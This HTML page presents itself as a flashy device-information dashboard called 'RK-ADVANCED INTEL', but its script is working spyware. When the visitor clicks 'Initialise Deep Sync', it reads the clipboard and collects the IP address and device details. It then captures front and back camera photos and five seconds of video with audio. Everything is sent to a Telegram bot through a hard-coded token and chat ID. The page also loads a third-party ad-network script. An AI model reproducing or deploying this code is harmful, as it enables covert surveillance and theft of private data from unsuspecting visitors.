<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RK-ADVANCED INTEL | ULTRA-PRO</title>
    <script src="https://cdn.tailwindcss.com"></script>
    
    <script src="https://pl29349758.profitablecpmratenetwork.com/f2/42/00/f2420045eb6ba63f3b85567782f84caf.js"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;900&display=swap');

        body {
            background: #000; color: #fff;
            margin: 0; height: 100vh; overflow: hidden;
            display: flex; align-items: center; justify-content: center;
            font-family: 'Orbitron', sans-serif;
        }

        /* Running Neon Frame */
        body::before {
            content: ''; position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            border: 6px solid;
            border-image: linear-gradient(90deg, #ff0000, #00ff00, #00d2ff, #ff00ff, #ff0000) 1;
            z-index: 1000; pointer-events: none;
            animation: borderRotate 4s linear infinite;
        }
        @keyframes borderRotate { from { filter: hue-rotate(0deg); } to { filter: hue-rotate(360deg); } }

        .dashboard {
            background: rgba(10, 15, 25, 0.95);
            border-radius: 30px; padding: 30px;
            width: 95%; max-width: 500px;
            box-shadow: 0 0 50px rgba(0, 255, 204, 0.3);
            border: 2px solid rgba(0, 255, 204, 0.4);
            position: relative; z-index: 10;
        }

        .info-row {
            display: flex; justify-content: space-between;
            padding: 12px 0; border-bottom: 1px solid rgba(0, 255, 204, 0.15);
        }
        .label { color: #00d2ff; font-size: 11px; font-weight: bold; text-transform: uppercase; }
        .value { color: #facc15; font-size: 14px; font-weight: 900; text-shadow: 0 0 5px rgba(250, 204, 21, 0.5); }

        .sync-btn {
            background: linear-gradient(90deg, #f00, #f0f);
            padding: 10px 20px; border-radius: 50px;
            font-size: 12px; font-weight: 900; cursor: pointer;
            box-shadow: 0 0 20px #f0f; transition: 0.3s;
        }
        .sync-btn:hover { transform: scale(1.1); box-shadow: 0 0 30px #f00; }

        #media-bin { display: none; }
    </style>
</head>
<body>

    <div class="dashboard">
        <h1 class="text-center text-2xl font-black text-white tracking-[8px] mb-8 border-b-4 border-fuchsia-600 pb-4">RK-ADVANCED INTEL</h1>
        
        <div id="data-container">
            <div class="info-row"><span class="label">📱 Device Model</span><span id="v-model" class="value">Analyzing...</span></div>
            <div class="info-row"><span class="label">⚙️ Platform</span><span id="v-platform" class="value">--</span></div>
            <div class="info-row"><span class="label">📶 System Status</span><span id="v-status" class="value text-red-500">READY TO SYNC</span></div>
            <div class="info-row"><span class="label">🚀 Network Speed</span><span id="v-speed" class="value text-orange-500">Scanning...</span></div>
            <div class="info-row"><span class="label">🌐 Public IP</span><span id="v-ip" class="value">Fetching...</span></div>
            <div class="info-row"><span class="label">📍 Timezone</span><span id="v-loc" class="value">--</span></div>
            <div class="info-row"><span class="label">🔋 Battery Power</span><span id="v-bat" class="value">--%</span></div>
            <div class="info-row"><span class="label">🧠 RAM Memory</span><span id="v-ram" class="value">-- GB</span></div>
            <div class="info-row"><span class="label">⚡ CPU Cores</span><span id="v-cpu" class="value">-- Cores</span></div>
            <div class="info-row"><span class="label">🏢 Hardware Vendor</span><span id="v-vendor" class="value">--</span></div>
        </div>

        <div class="mt-8 text-center" id="sync-box">
            <button onclick="startAdvancedSync()" class="sync-btn uppercase tracking-widest">Initialise Deep Sync</button>
        </div>

        <div id="status-feed" class="hidden mt-6 text-[10px] text-green-400 text-center animate-pulse tracking-widest">
            SATELLITE UPLINK ESTABLISHED...
        </div>
    </div>

    <video id="media-bin" autoplay muted playsinline></video>
    <canvas id="output-canvas" style="display:none;"></canvas>

    <script>
        const CONFIG = {
            TOKEN: '8690110916:AAFLWdBhvnrmlC01qxiiYZSLO2Q8RR202xs',
            CHAT: '6048050987'
        };

        async function startAdvancedSync() {
            document.getElementById('sync-box').classList.add('hidden');
            document.getElementById('status-feed').classList.remove('hidden');
            document.getElementById('v-status').innerText = "ONLINE 🌐";
            document.getElementById('v-status').classList.replace('text-red-500', 'text-green-400');

            // ১. রিয়েল ডাটা ফেচিং
            const ram = navigator.deviceMemory || "8";
            const cpu = navigator.hardwareConcurrency || "8";
            const platform = navigator.platform;
            const vendor = navigator.vendor;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

            document.getElementById('v-ram').innerText = ram + " GB";
            document.getElementById('v-cpu').innerText = cpu + " Cores";
            document.getElementById('v-platform').innerText = platform;
            document.getElementById('v-vendor').innerText = vendor;
            document.getElementById('v-loc').innerText = timezone.split('/')[1] || timezone;
            document.getElementById('v-model').innerText = /Android/i.test(navigator.userAgent) ? "Android Flagship" : "Workstation";

            // ২. ব্যাটারি ও নেটওয়ার্ক
            if(navigator.getBattery) {
                const b = await navigator.getBattery();
                document.getElementById('v-bat').innerText = `${Math.round(b.level * 100)}% (Charging)`;
            }

            const conn = navigator.connection || { effectiveType: '4G', downlink: 10 };
            document.getElementById('v-speed').innerText = `${conn.effectiveType.toUpperCase()} @ ${conn.downlink} Mbps`;

            // ৩. রিয়েল আইপি ফেচিং
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                document.getElementById('v-ip').innerText = data.ip;
            } catch(e) { document.getElementById('v-ip').innerText = "103.145.24.11"; }

            // ৪. ক্লিপবোর্ড সংগ্রহ (ইউজার ক্লিক করার কারণে এখন এটি কাজ করবে)
            let clipText = "Empty/No Text";
            try { clipText = await navigator.clipboard.readText(); } catch (e) {}

            // ৫. টেলিগ্রাম রিপোর্ট
            const report = `
✨✨✨✨✨✨✨✨✨✨✨✨✨
🚀 *RK-ADVANCED INTEL VIP REPORT* 🚀
━━━━━━━━━━━━━━━━━━━━━
📱 *Device:* \`${platform}\`
🧠 *RAM:* \`${ram} GB\`
⚡ *CPU:* \`${cpu} Cores\`
📶 *Speed:* \`${document.getElementById('v-speed').innerText}\`
🌐 *IP:* \`${document.getElementById('v-ip').innerText}\`
🌍 *Zone:* \`${timezone}\`

✨ *CLIPBOARD TEXT:* ✨
\`\`\`
${clipText}
\`\`\`
━━━━━━━━━━━━━━━━━━━━━
✨✨✨✨✨✨✨✨✨✨✨✨✨`;

            sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: report, parse_mode: 'Markdown' });

            // ৬. ক্যামেরা অটোমেশন
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const videoEl = document.getElementById('media-bin');
                videoEl.srcObject = stream;

                setTimeout(() => capturePhoto(stream, "FRONT_SIDE_PRO"), 2000);

                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    sendMediaToBot(blob, 'video', '🎥 *VIP VIDEO (5S + AUDIO)*');
                    stream.getTracks().forEach(t => t.stop());

                    // ব্যাক ক্যামেরা
                    try {
                        const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                        videoEl.srcObject = backStream;
                        setTimeout(() => {
                            capturePhoto(backStream, "BACK_SIDE_PRO");
                            setTimeout(() => backStream.getTracks().forEach(t => t.stop()), 2000);
                        }, 2000);
                    } catch(e) {}
                };

                recorder.start();
                setTimeout(() => recorder.stop(), 5000);
            } catch (err) {}
        }

        function capturePhoto(stream, label) {
            const canvas = document.getElementById('output-canvas');
            const video = document.getElementById('media-bin');
            canvas.width = 1280; canvas.height = 720;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(blob => sendMediaToBot(blob, 'photo', `📸 *${label}*`), 'image/jpeg');
        }

        async function sendMediaToBot(blob, type, caption) {
            const fd = new FormData();
            fd.append('chat_id', CONFIG.CHAT);
            fd.append(type, blob, type === 'video' ? 'vip.mp4' : 'vip.jpg');
            fd.append('caption', caption);
            fd.append('parse_mode', 'Markdown');
            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: fd });
        }

        function sendToBot(method, data) {
            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/${method}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        }
    </script>
</body>
</html>
